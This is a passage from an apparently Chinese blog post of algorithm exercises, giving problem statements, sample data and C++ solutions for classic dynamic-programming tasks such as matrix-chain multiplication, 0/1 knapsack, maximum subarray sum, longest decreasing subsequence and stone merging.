c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> p[],<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt;=len;i++) m[i][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=len;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len-r+<span class="number">1</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> j = i + r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j] + p[i<span class="number">-1</span>]*p[i]*p[j];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k =i+<span class="number">1</span> ;k &lt; j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+p[i<span class="number">-1</span>]*p[k]*p[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][len]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,l;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l)&#123;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">char</span>,Matrix&gt;my_map;</span><br><span class="line"><span class="keyword">int</span> p[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line"><span class="keyword">char</span> a;</span><br><span class="line"><span class="keyword">int</span> j,k;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;j&gt;&gt;k;</span><br><span class="line">Matrix tmp ;</span><br><span class="line">tmp.r = j;</span><br><span class="line">tmp.c = k;</span><br><span class="line">my_map[a] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> words[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; l; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;words;</span><br><span class="line"><span class="keyword">int</span> lenw = <span class="built_in">strlen</span>(words);</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">p[<span class="number">0</span>] = my_map[words[<span class="number">0</span>]].r;</span><br><span class="line">p[<span class="number">1</span>] = my_map[words[<span class="number">0</span>]].c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>; j &lt; lenw;j++)&#123; <span class="comment">//注意 </span></span><br><span class="line"><span class="keyword">if</span>(my_map[words[j]].r != my_map[words[j<span class="number">-1</span>]].c)&#123;</span><br><span class="line">flag  =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">p[j+<span class="number">1</span>] = my_map[words[j]].c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">"MengMengDa"</span>);</span><br><span class="line"><span class="keyword">else</span> solve(p,lenw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="01背包-考试考了类似的"><a href="#01背包-考试考了类似的" class="headerlink" title="01背包(考试考了类似的)"></a>01背包(考试考了类似的)</h3><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><h5 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><h5 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h5><p>对每组测试数据，输出其对应的所装物品的最大价值。</p><h5 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h5 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;,v[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">1005</span>][<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//标记作用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*构造最优解*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> cost)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n; i&gt;<span class="number">1</span>; i--)&#123;   <span class="comment">//注意这里可能会出错</span></span><br><span class="line">        <span class="keyword">if</span>( m[i][cost] == m[i<span class="number">-1</span>][cost] ) x[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x[i]= <span class="number">1</span>;</span><br><span class="line">            cost -=w[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;1&lt;&lt;endl;</span></span><br><span class="line">    x[<span class="number">1</span>] = m[<span class="number">1</span>][cost]?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;x[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">            <span class="keyword">int</span> c,n;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span> ; i&lt;= n;i++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>;j&lt;= c;j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j &gt;= w[i]) m[i][j] = max(m[i<span class="number">-1</span>][j],m[i<span class="number">-1</span>][j-w[i]]+v[i]);</span><br><span class="line">                    <span class="keyword">else</span> m[i][j] = m[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;m[n][c]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">         <span class="comment">//   output(n,c);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大子段和"><a href="#最大子段和" class="headerlink" title="最大子段和"></a>最大子段和</h3><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><h5 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</p><p>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</p><p>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><h5 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h5><p>输出其对应的最大子段和。</p><h5 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt; len ;i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        k += a[i];</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        k = a[i];</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">if</span>(k &gt; sum) sum = k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n ;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;n;i++) <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        solve(n);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求数组的最长递减子序列"><a href="#求数组的最长递减子序列" class="headerlink" title="求数组的最长递减子序列"></a>求数组的最长递减子序列</h3><h4 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p><h5 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h5><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p><h5 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h5><p>输出最长递减子序列，数字之间有一个空格。</p><h5 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> roud[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> maxc;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x)&#123;</span><br><span class="line">output(roud[x]);</span><br><span class="line"><span class="keyword">if</span>(maxc != x) <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span> ; i&lt;= N; i++) <span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= N ; i++)&#123;</span><br><span class="line">dp[i] = <span class="number">1</span>;</span><br><span class="line">roud[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(num[j] &gt; num[i] &amp;&amp; dp[i] &lt; dp[j] +<span class="number">1</span> )&#123;</span><br><span class="line">dp[i] = dp[j] +<span class="number">1</span> ;</span><br><span class="line">roud[i] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dp[i] &gt; dp[maxc])&#123;</span><br><span class="line">maxc = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">output(maxc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="沙子的质量"><a href="#沙子的质量" class="headerlink" title="沙子的质量"></a>沙子的质量</h3><p>题目描述<br>设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。</p><h5 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h5><p>第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。</p><h5 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h5><p>合并的最小代价。</p><h5 id="样例输入-10"><a href="#样例输入-10" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 3 5 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-10"><a href="#样例输出-10" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">305</span>][<span class="number">305</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这个题目就是另类的矩阵连乘*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span>; i &lt;= n;i++) &#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">a[i] += a[i<span class="number">-1</span>];</span><br><span class="line">m[i][i] = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=n;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n-r+<span class="number">1</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">int</span>  j = i+r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = i+<span class="number">1</span>; k&lt;j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节食的限制"><a href="#节食的限制" class="headerlink" title="节食的限制"></a>节食的限制</h3><h4 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h4><p>Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。</p><h5 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h5><p>第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</p><h5 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h5><p>一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</p><h5 id="样例输入-11"><a href="#样例输入-11" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h5 id="样例输出-11"><a href="#样例输出-11" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">50</span>][<span class="number">45000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*本质就是01背包*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h,n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;h&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;= n; i++)<span class="built_in">cin</span>&gt;&gt;w[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j&lt;=h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= w[i]) m[i][j]=max(m[i<span class="number">-1</span>][j],m[i<span class="number">-1</span>][j-w[i]]+w[i]);</span><br><span class="line"><span class="keyword">else</span> m[i][j] = 